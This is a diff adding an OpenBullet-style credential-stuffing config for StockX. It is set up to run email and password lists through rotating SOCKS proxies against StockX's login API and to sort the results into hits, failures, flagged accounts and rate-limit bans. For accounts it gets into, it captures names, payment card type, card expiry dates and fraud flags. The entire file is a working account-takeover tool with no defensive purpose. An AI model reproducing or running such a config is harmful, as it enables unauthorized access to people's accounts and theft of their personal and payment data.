@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "StockX",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-07T16:19:04.8194026+07:00",
+  "AdditionalInfo": "",
+  "Author": "SamoanMafia",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": true,
+  "OnlySsl": false,
+  "MaxProxyUses": 1,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://stockx.com/api/login" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect email or password" 
+  KEYCHAIN Success OR 
+    KEY "{\"Customer\":{\"id\":\"" 
+  KEYCHAIN Failure OR 
+    KEY ",\"flagged\":true" 
+  KEYCHAIN Ban OR 
+    KEY "\"title\": \"Too many requests\"," 
+PARSE "<SOURCE>" LR "firstName\":\"" "\"" Recursive=FALSE -> CAP "First Name" "" "" 
+PARSE "<SOURCE>" LR "lastName\":\"" "\"" Recursive=FALSE -> CAP "Last Name" "" "" 
+PARSE "<SOURCE>" LR "Billing\":{\"cardType\":\"" "\"" Recursive=TRUE -> CAP "Payment Type" "" "" 
+PARSE "<SOURCE>" LR "expirationDate\":\"" "\"" Recursive=TRUE -> CAP "Exp Date" "" "" 
+PARSE "<SOURCE>" LR "emailVerified\":" "," Recursive=FALSE -> CAP "Verified Email" "" "" 
+PARSE "<SOURCE>" LR ",\"flagged\":" "," Recursive=FALSE -> CAP "Flagged For Suspicious" "" "" 
+PARSE "<SOURCE>" LR "hasBuyerReward\":" "," Recursive=FALSE -> CAP "Buyer Rewards" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Billing\":{\"cardType\":\"null" 
